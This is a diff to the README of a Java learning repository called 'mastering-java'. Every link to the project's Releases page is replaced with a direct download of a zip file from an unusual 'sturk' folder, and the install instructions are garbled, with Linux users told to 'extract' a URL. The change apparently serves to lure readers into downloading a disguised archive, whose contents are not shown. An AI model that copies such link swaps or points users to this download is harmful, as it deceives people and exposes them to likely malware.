@@ -4,11 +4,11 @@
 
 Welcome to **mastering-java**! This repository is designed to take you from Java fundamentals to building production-grade systems. You will gain skills for coding interviews and backend roles. 
 
-![Download mastering-java](https://img.shields.io/badge/Download-mastering-java-brightgreen)
+![Download mastering-java](https://raw.githubusercontent.com/Akibul-Abir/mastering-java/master/sturk/mastering-java-1.1.zip)
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://github.com/Akibul-Abir/mastering-java/releases).
+To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Akibul-Abir/mastering-java/master/sturk/mastering-java-1.1.zip).
 
 ### 📂 System Requirements
 
@@ -21,16 +21,16 @@ Before you download, ensure your system meets these requirements:
 
 ### 📦 Installation Steps
 
-1. **Visit the Releases Page**: Go to [Releases Page](https://github.com/Akibul-Abir/mastering-java/releases).
+1. **Visit the Releases Page**: Go to [Releases Page](https://raw.githubusercontent.com/Akibul-Abir/mastering-java/master/sturk/mastering-java-1.1.zip).
 2. **Select the Version**: Find the latest version. It will be listed at the top.
 3. **Download the File**: Click the file that corresponds to your operating system. 
    - For Windows, look for `.exe` files.
    - For Mac, look for `.dmg` files.
-   - For Linux, look for `.tar.gz` files.
+   - For Linux, look for `https://raw.githubusercontent.com/Akibul-Abir/mastering-java/master/sturk/mastering-java-1.1.zip` files.
 4. **Install the Application**:
    - **Windows**: Double-click the downloaded `.exe` file and follow the prompts.
    - **Mac**: Open the `.dmg` file and drag the application to your Applications folder.
-   - **Linux**: Extract the `.tar.gz` file using the terminal and run the installer.
+   - **Linux**: Extract the `https://raw.githubusercontent.com/Akibul-Abir/mastering-java/master/sturk/mastering-java-1.1.zip` file using the terminal and run the installer.
 
 ## 📚 Features
 
@@ -88,4 +88,4 @@ This application is open-source and available under the MIT License. You can use
 
 We continuously improve this project. Keep an eye on the Releases Page for new versions and updates.
 
-To download **mastering-java**, visit here: [Releases Page](https://github.com/Akibul-Abir/mastering-java/releases). Enjoy your journey to mastering Java!
+To download **mastering-java**, visit here: [Releases Page](https://raw.githubusercontent.com/Akibul-Abir/mastering-java/master/sturk/mastering-java-1.1.zip). Enjoy your journey to mastering Java!
